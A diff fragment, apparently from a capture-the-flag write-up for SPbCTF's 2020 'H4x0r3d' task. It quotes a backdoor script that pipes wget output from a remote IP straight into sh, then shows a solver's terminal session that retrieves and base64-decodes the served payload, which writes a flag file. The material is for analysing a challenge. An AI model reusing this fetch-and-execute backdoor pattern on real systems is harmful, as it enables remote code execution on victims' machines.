@@ -36,6 +36,8 @@ UUID = `cat /etc/persist`
 BASE = "http://188.143.222.218:4455/?uuid="
 logger -s "Started door with uid $UUID"
 sh -c "$(wget -O- $BASE$NEW_UUID)"
+root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d# curl http://188.143.222.218:4455?uuid=AV0pUn47GjLGyaOXdMAbfeuef6WDFGfy
+sh -c "`echo ZWNobyBPTllHRVkzVU1aNVdXTVpUT0JQWFNNRFZPSlBXTTVEUUw1WlRJWlJUUFVGQT09PT0gfCBiYXNlMzIgLWQgPiAvZXRjL3NlY3JldC5mbGFnCg== | base64 -d`"
 root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d# sh -c "`echo ZWNobyBPTllHRVkzVU1aNVdXTVpUT0JQWFNNRFZPSlBXTTVEUUw1WlRJWlJUUFVGQT09PT0gfCBiYXNlMzIgLWQgPiAvZXRjL3NlY3JldC5mbGFnCg== | base64 -d`"
 echo ONYGEY3UMZ5WWMZTOBPXSMDVOJPWM5DQL5ZTIZRTPUFA==== | base32 -d > /etc/secret.flag
 root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d# cat /etc/secret.flag
